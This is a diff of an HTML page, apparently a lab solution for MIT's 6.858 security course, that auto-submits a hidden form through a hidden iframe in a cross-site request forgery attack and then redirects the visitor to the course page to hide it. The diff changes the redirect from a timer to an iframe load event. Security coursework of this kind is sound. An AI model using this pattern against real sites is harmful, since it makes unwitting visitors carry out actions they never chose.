@@ -1,7 +1,7 @@
 <!DOCTYPE html>
 <html>
 <body>
-<iframe style="visibility:hidden" name="iframe">
+<iframe style="visibility:hidden" name="iframe" id="iframe">
 </iframe>
 <div style="visibility:hidden" id='idiv'>
   <form method="post" id="csfr"
@@ -13,9 +13,9 @@
 </form>
 </div>
 <script type="text/javascript">
+  iframe = document.getElementById("iframe");
+  iframe.addEventListener("load", function(){window.location="http://css.csail.mit.edu/6.858/2013/";});
   document.getElementById("csfr").submit();
-  setTimeout(function()
-  {window.location="http://css.csail.mit.edu/6.858/2013/";},1000);
 </script>
 </body>
 </html>
